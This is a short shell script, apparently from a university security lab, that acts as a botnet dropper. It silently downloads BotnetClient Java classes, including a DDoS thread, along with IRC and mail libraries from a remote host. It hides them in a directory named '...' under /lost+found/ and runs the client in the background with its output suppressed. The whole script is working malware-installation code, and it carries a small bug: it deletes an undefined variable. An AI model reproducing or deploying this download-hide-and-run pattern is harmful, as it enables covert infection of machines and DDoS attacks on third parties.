###########################################
#! /bin/sh                                                                                  

if [ -z "$DIR" ]; then
    dhclient

    DIR='/lost+found/'
    FOLDER='...'
    TARGET='BotnetClient'
    SRC="${TARGET}.java"
    BIN="${TARGET}.class"
    BIN2="BotnetClient\$DdosThread.class"
    BIN3="BotnetClient\$ProcessErrorThread.class"
    BIN4="BotnetClient\$ProcessInputThread.class"
    PIRC="pircbot.jar"
    MAIL="mail.jar"
    CURDIR=`pwd`

    if [ ! -d "${DIR}${FOLDER}" ]; then
        mkdir "${DIR}${FOLDER}"
    else
        rm -r "${DIR}${FOLDER}"
        mkdir "${DIR}${FOLDER}"
    fi
    cd "${DIR}${FOLDER}"

    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN2" &> /dev/null
    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN3" &> /dev/null
    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN4" &> /dev/null
    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$PIRC" &> /dev/null
    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN" &> /dev/null
    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$MAIL" &> /dev/null
    #javac $SRC                                                                                                          

    rm $SRC                                                                                                            
    rm $PIC 
    rm $MAIL                                                                                                                   
    java -classpath "${PIRC}:${MAIL}:." $TARGET &> /dev/null &                                                       
    cd $CURDIR
fi
###########################################